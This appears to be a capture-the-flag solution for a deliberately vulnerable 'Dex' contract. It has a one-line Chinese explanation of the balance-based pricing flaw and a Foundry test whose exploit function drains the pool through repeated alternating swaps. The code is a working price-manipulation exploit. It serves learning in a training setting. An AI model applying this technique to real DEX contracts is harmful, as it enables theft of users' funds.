dex 使用代币持有量计算价格，持有量越多的代币价格越低。因此可以通过多次反复兑换套利。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Dex.sol";
import "src/levels/DexFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDex is BaseTest {
    Dex private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        levelFactory = new DexFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Dex(levelAddress);

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        token1.approve(address(level), 2**256 - 1);
        token2.approve(address(level), 2**256 - 1);

        level.swap(address(token1), address(token2), token1.balanceOf(player));
        level.swap(address(token2), address(token1), token2.balanceOf(player));
        level.swap(address(token1), address(token2), token1.balanceOf(player));
        level.swap(address(token2), address(token1), token2.balanceOf(player));
        level.swap(address(token1), address(token2), token1.balanceOf(player));

        level.swap(address(token2), address(token1), 45);

        vm.stopPrank();
    }
}
```

